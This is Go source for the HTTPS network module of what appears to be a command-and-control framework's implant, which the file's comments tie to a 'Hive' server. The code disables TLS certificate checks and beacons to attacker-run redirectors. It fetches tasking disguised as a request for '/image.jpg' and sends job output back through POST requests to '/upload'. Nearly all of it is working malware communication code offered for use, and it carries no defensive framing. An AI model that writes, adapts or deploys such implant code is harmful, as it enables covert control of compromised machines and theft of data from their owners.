// +build selfsignedhttpsgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//	 Network Method: Egress to a https Golang Server redirector, using a self signed certificate.Implant will not check target TLS fingenprint.
//
//   Warnings:       Will work with MITM tls proxies, but server certificate is not signed.				 
//					 
//	 Fingenprint:    GO-LANG Client TLS Fingerprint
//
//   IOC Level:      Medium
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////


package network

import (

	"crypto/tls"
	"bytes"
    "net/http"
    "encoding/json"	
    "io/ioutil"
    "time"
    "net"
)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type BiSelfSignedhttps struct {
	Port string   `json:"port"`
	Redirectors []string   `json:"redirectors"`
}

var moduleParams *BiSelfSignedhttps

/*
Description: SelfSignedhttps,Prepare Redirector Slice
Flow:
A.JSON Decode redirector data
B.Loop over each redirector and craft a working https endpoint to connect to
*/
func PrepareNetworkMocule(jsonstring string) []string{

	var redirectors []string
	errDaws := json.Unmarshal([]byte(jsonstring),&moduleParams)
	if errDaws != nil{
		return redirectors
	}
	for _,red := range moduleParams.Redirectors{
		redirectors = append(redirectors,red +":"+ moduleParams.Port)
	}

	return redirectors
}

/*
Description: SelfSignedhttps,Retrieve Jobs
Flow:
A.Prepare https client, configure the client to accept self-signed certificates
B.Get request against target redirector to retrieve jobs
*/
func RetrieveJobs(redirector string,authentication string) ([]byte,string){

	var newJobs []byte
	var error string
	
	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   20 * time.Second,   
        	ExpectContinueTimeout: 10 * time.Second,
        	ResponseHeaderTimeout: 10 * time.Second,	
		},

		Timeout: 30 * time.Second,
	}
	
	req, _ := http.NewRequest("GET", "https://"+redirector+"/image.jpg", nil)
	req.Header.Set("Authorization", authentication)
	res, err := client.Do(req)
	if err != nil {
		error = "Connection errir with redirector "+redirector+":"+err.Error()
		return newJobs,error
	}

	newJobs,_ = ioutil.ReadAll(res.Body)
    return newJobs,"Success"
}

/*
Description: SelfSignedhttps,Retrieve Jobs
Flow:
A.Prepare https client, configure the client to accept self-signed certificates
B.POST request against target redirector to send a job
*/
func SendJobs(redirector string,authentication string,encodedJob []byte) string{

	var error string

	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   10 * time.Second,   
        	ExpectContinueTimeout: 4 * time.Second,
        	ResponseHeaderTimeout: 3 * time.Second,	
		},

		Timeout: 20 * time.Second,
	}
	
	req, _ := http.NewRequest("POST", "https://"+redirector+"/upload",bytes.NewBuffer(encodedJob))
	req.Header.Set("Authorization", authentication)
	
	_, err := client.Do(req)
	if err != nil {
		error = "Connection error with redirector "+redirector+":"+err.Error()
		return error
	}

	return "Success"
}